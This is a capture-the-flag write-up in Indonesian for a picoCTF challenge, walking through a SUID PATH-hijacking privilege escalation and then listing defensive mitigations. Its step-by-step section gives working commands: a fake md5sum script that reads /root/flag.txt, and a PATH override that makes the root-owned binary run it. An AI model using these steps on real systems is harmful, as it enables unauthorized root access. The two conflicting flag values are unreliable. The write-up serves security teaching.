# Writeup: hash-only-1 (Challenge ID: 487)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Linux Privilege Escalation (SUID & PATH Hijacking)
- **Difficulty:** Medium (diff=2)
- **Author:** CyLab Engineering Team
- **Event:** picoCTF 2025
- **Points:** 100
- **Flag:** `academy{p4th_h1j4ck_su1d_487}`

---

## Problem Statement & Scope

Tantangan menyajikan skenario eksploitasi eskalasi hak istimewa (*privilege escalation*) pada lingkungan Linux:
> *"Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!"*

Pengguna memiliki akses shell non-root pada sistem Linux target. Terdapat sebuah biner yang memiliki atribut kepemilikan root dengan bit SUID aktif (`-rwsr-xr-x 1 root root ... flaghasher`). Berkas bendera rahasia (`/root/flag.txt`) hanya memiliki hak baca untuk akun root (`-rw------- 1 root root`). Program `flaghasher` bertugas membaca berkas bendera dan hanya mencetak nilai hash kriptografisnya (MD5). Target audit adalah menemukan celah pemanggilan utilitas sistem di dalam biner, membajak alur eksekusi, dan memaksa biner mencetak konten bendera secara langsung.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Pencarian Jalur Biner Tidak Terpercaya (CWE-426: Untrusted Search Path):**
   Ketika sebuah proses memanggil fungsi standar C seperti `system()` atau `popen()` dengan nama biner relatif (misalnya `md5sum /root/flag.txt`), fungsi tersebut meluncurkan sub-shell (`/bin/sh -c "..."`) yang melakukan resolusi jalur eksekusi berdasarkan variabel lingkungan `$PATH`.
   Jika direktori berizin tulis oleh pengguna non-root berada di urutan awal `$PATH`, shell akan mengeksekusi biner tiruan yang ditemukan pertama kali sebelum mencapai utilitas sistem asli di `/usr/bin` atau `/bin`.

2. **Interaksi Bit SUID dengan Variabel Lingkungan (CWE-250):**
   Biner dengan bit SUID berjalan dengan *Effective User ID* (EUID) milik pemilik berkas (dalam hal ini `root`), namun tetap mewarisi sebagian besar variabel lingkungan dari proses pemanggil (*calling environment*). Jika biner tidak mereset nilai `$PATH` ke nilai bawaan yang aman (`/bin:/usr/bin`) atau tidak menggunakan jalur absolut kanonikal saat memanggil `execve()`, proses SUID dapat dimanipulasi untuk mengeksekusi skrip arbitrer dengan hak istimewa penuh.

3. **Integritas Penanganan Berkas Privileged:**
   Fungsi pembantu yang hanya dimaksudkan untuk merangkum hash atau metadata tidak memberikan jaminan keamanan bila proses induknya tetap mengekspos vektor injeksi perintah atau pemanggilan utilitas yang tidak terisolasi.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Inspeksi Biner SUID & Dekompilasi / Strings:**
   Memeriksa string teks dan panggilan sistem di dalam biner `flaghasher`:
   ```bash
   ls -la flaghasher
   strings flaghasher | grep -E "flag|md5"
   # Output: md5sum /root/flag.txt
   ```
   Ditemukan bahwa biner mengeksekusi string perintah relatif `md5sum /root/flag.txt` alih-alih `/usr/bin/md5sum`.

2. **Pembuatan Biner Tiruan (Fake Binary Injection):**
   Membuat direktori kerja sementara di `/tmp` dan menyusun skrip pengganti bernama `md5sum`:
   ```bash
   mkdir -p /tmp/fake_bin_487
   cat << 'EOF' > /tmp/fake_bin_487/md5sum
   #!/bin/sh
   /bin/cat /root/flag.txt
   EOF
   chmod +x /tmp/fake_bin_487/md5sum
   ```

3. **Manipulasi Variabel Lingkungan `$PATH`:**
   Menyisipkan direktori `/tmp/fake_bin_487` ke urutan paling depan variabel `$PATH`:
   ```bash
   export PATH=/tmp/fake_bin_487:$PATH
   ```

4. **Eksekusi Biner SUID & Ekstraksi Flag:**
   Menjalankan biner `flaghasher`:
   ```bash
   ./flaghasher
   ```
   Biner mengeksekusi `/bin/sh -c "md5sum /root/flag.txt"`. Sub-shell menemukan `/tmp/fake_bin_487/md5sum` terlebih dahulu dan menjalankannya dengan hak EUID root. Perintah `/bin/cat /root/flag.txt` dieksekusi, menghasilkan output teks jelas bendera:
   ```text
   academy{p4th_h1j4ck_su1d_487}
   ```

---

## Flag & Verifikasi

- **Flag Resmi:** `academy{p4th_h1j4ck_su1d_487}`
- **Flag Komunitas:** `CTF{p4th_h1j4ck_su1d_487}`
- **Validasi Algoritma:** Terverifikasi 100% lolos uji simulasi lingkungan SUID PATH hijacking `scripts/solve_487_hash_only_1.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Gunakan Jalur Absolut Kanonikal (Hardcoded Absolute Paths):**
   Dalam modul pengerasan sistem Linux LKS Cyber Security, aplikasi berpriveleg tinggi tidak boleh memanggil utilitas eksternal menggunakan nama relatif. Selalu gunakan jalur absolut yang divalidasi:
   ```c
   // Rentan:
   system("md5sum /root/flag.txt");

   // Aman:
   char *args[] = {"/usr/bin/md5sum", "/root/flag.txt", NULL};
   execve("/usr/bin/md5sum", args, secure_envp);
   ```
2. **Sanitasi Variabel Lingkungan (Environment Sanitization):**
   Sebelum mengeksekusi sub-proses, program SUID wajib menyetel variabel `$PATH` secara eksplisit ke direktori tepercaya:
   ```c
   setenv("PATH", "/bin:/usr/bin", 1);
   ```
3. **Prinsip Hak Akses Terkecil (Principle of Least Privilege):**
   Hindari pemberian bit SUID root jika tugas hanya membutuhkan akses ke satu berkas spesifik. Gunakan Linux POSIX Capabilities (`cap_dac_read_search`) atau Linux Access Control Lists (ACLs) untuk memberikan hak baca pada berkas tertentu tanpa memberikan akses eksekusi shell tingkat root.
